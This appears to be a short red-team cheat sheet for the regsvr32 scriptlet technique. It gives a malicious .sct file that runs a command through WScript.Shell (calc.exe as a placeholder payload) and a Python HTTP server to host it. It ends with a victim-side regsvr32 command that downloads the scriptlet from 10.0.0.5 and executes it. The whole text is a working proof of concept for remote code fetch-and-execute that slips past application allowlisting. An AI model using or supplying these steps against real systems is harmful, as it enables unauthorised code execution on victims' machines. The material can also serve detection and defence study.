# Attacker server
- Create malicious file (back.sct):
```xml
<?XML version="1.0"?>
<scriptlet>
<registration
  progid="TESTING"
  classid="{A1112221-0000-0000-3000-000DA00DABFC}" >
  <script language="JScript">
    <![CDATA[
      var foo = new ActiveXObject("WScript.Shell").Run("calc.exe"); 
    ]]>
</script>
</registration>
</scriptlet>
```
- Run listenning server:
```python
python3 -m http.server 80
```

# Victim machine
- Open cmd.exe and run the following command
```cmd
regsvr32.exe /s /i:http://10.0.0.5/back.sct scrobj.dll
```
